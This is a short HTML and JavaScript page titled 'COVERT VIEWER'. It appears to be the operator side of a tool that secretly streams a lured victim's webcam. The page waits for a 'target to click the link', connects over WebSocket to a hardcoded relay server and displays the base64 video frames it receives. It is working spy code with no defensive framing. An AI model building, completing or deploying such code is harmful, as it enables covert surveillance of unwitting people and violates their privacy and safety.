<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OmniLink Viewer</title>
    <style>
        body {
            background: #050505;
            color: #00ffcc;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding: 20px;
        }

        img {
            max-width: 80%;
            border: 2px solid #00ffcc;
            border-radius: 5px;
            box-shadow: 0 0 15px #00ffcc;
        }

        h1 {
            text-shadow: 0 0 10px #00ffcc;
        }
    </style>
</head>

<body>
    <h1>COVERT VIEWER</h1>
    <p>Waiting for target to click the link...</p>
    <img id="targetCam" src="" alt="No Signal" style="display:none;">

    <script>
        const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
        const host = window.location.host || "hangon-k31m.onrender.com";
        let ws = new WebSocket(`${protocol}//${host}/ws/controller`);

        ws.onopen = () => console.log("Viewer connected to server.");

        ws.onmessage = function (event) {
            if (event.data.startsWith("VIDEO:")) {
                // Extract the base64 image and display it
                const imgData = event.data.replace("VIDEO:", "");
                const img = document.getElementById('targetCam');
                img.src = imgData;
                img.style.display = 'inline-block';
            }
        };
    </script>
</body>

</html>
